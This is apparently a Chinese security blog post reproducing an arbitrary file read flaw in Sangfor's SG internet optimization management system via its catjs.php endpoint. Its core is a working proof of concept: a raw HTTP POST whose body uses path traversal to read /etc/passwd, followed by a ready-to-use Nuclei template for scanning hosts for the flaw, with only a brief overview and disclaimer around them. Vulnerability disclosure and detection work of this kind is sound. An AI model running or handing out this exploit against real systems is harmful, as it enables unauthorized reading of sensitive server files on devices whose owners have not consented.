#  【漏洞复现】深信服SG上网优化管理系统catjs.php任意文件读取漏洞 附POC   
YGnight  night安全   2023-10-12 21:03  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/SaibaRNhOjqhXmCUxdZR0bITTD3G86qXKkfhZx9pRCUfvMAibuyyKcqkre0yrOV0Sc8YxlMKupVaDA7dCTIKol4g/640?wx_fmt=gif "")  
  
公众号新规  
只对常读  
和  
星标的公众号才能展示大图推送，  
建议大家把公众号“  
n  
i  
g  
h  
t  
安  
全”设为  
星  
标  
，  
否  
则  
可  
能  
就  
看  
不  
到  
啦  
！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhXmCUxdZR0bITTD3G86qXKHom3VoibZNT4A2a55gpRYic11wrialHQyhkufykLIM6vIwC7tr3sE9SKQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/SaibaRNhOjqhXmCUxdZR0bITTD3G86qXKZnDbw7DhNgtPBu2ibEpN2v7qicDkKyIA9lk99zxNwOvWLxk85LBIoib3Q/640?wx_fmt=jpeg "1697110242794028.jpg")  
  
  
免责声明  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/SaibaRNhOjqg4CicjYhkyn7j8xeutLIIGlA3Pam1Oxz5ujOUsmPibr5J9NCiagtp8nGEEXPeJiaUeWkN3v1XXSS9Vfw/640?wx_fmt=gif "")  
  
  
  
night安全致力于分享技术学习和工具掌握。然而请注意不得将此用于任何未经授权的非法行为，请您严格遵守国家信息安全法律法规。任何违反法律、法规的行为，均与本人无关。如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/oMlX8Lll9JhtrlOVpAFwbbnTXyrqweQO0kKLSPTRtSL4MEXjM3TdHU1GMhb3ysoFV3ic9hKDLibzic6T7ADMnfNnA/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif "")  
  
漏洞概述  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif "")  
  
  
深信服 SG上网优化管理系统 catjs.php 存在任意文件读取漏洞，攻击者可利用该漏洞直接读取服务器敏感文件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhXmCUxdZR0bITTD3G86qXK5EVCaLCYMWb6qEveicrAdN96sA7bQW6zUkHmhlWfj2P2cyqh8ibdBVKg/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif "")  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif "")  
  
  
POC:  
  
```
POST /php/catjs.php HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 35
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
 
["../../../../../../../etc/passwd"]
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhXmCUxdZR0bITTD3G86qXKRiaYLLaZUxdalJRBShR9NegcOTP1YQ1Zr9NOEbHlYvuQjuMIaicyhQ6Q/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif "")  
  
NUCLEI POC  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhXmCUxdZR0bITTD3G86qXKfWF7u8bGRaD9gHV9pBK9b7OXM3W60WN21Vax6fxTsibjBLfUIkrwEtw/640?wx_fmt=png "")  
  
```
id: sangfor-sg-catjs-fileread
 
info:
  name: 深信服SG上网优化管理系统catjs.php任意文件读取漏洞
  author: YGnight
  severity: high
  description: description
  reference:
    - https://
  tags: tags
 
requests:
  - raw:
      - |-
        POST /php/catjs.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
        Content-Length: 35
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
 
        ["../../../../../../../etc/passwd"]
 
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - 'root:'
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/oMlX8Lll9JhtrlOVpAFwbbnTXyrqweQO0kKLSPTRtSL4MEXjM3TdHU1GMhb3ysoFV3ic9hKDLibzic6T7ADMnfNnA/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/SaibaRNhOjqhXmCUxdZR0bITTD3G86qXKpciaqHNr4Y60SPF1XeS358wiceQDUm8K5zh7RZsnknYxKJ37kkkcpWZg/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SaibaRNhOjqhXmCUxdZR0bITTD3G86qXKaehOcQPNxCFMKoEU9icdQfLRW5AIhL360ZtsWx3rRcsnQOcnXLUTNibA/640?wx_fmt=png "")  
  
****  
扫  
码  
关  
注  
  
获  
得  
更  
多  
资  
讯  
  
****  
  
